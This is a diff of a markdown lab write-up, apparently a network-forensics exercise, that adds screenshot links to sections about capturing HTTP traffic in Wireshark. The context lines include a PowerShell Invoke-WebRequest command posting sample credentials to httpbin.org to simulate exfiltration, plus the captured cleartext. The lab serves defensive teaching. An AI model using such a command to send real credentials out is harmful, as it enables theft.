@@ -29,7 +29,7 @@ Invoke-WebRequest -Uri "http://httpbin.org/post" -Method POST -Body "username=ad
 ```
 
 This simulates an attacker sending stolen credentials across the network.
-
+![Powershell](./images/psserver.png)
 ---
 
 ## 2️⃣ Captured Network Traffic
@@ -52,7 +52,7 @@ http
 ```
 
 This allowed us to focus only on HTTP traffic.
-
+![Wireshark](./images/wiresharkhttp.png)
 ---
 
 ## 4️⃣ Identified Suspicious Activity
@@ -80,7 +80,7 @@ We were able to view the transmitted data:
 ```text
 username=admin&password=1234
 ```
-
+![Wireshark TCP stream](./images/wiresharkstream.png)
 ---
 
 # 🚨 Key Findings
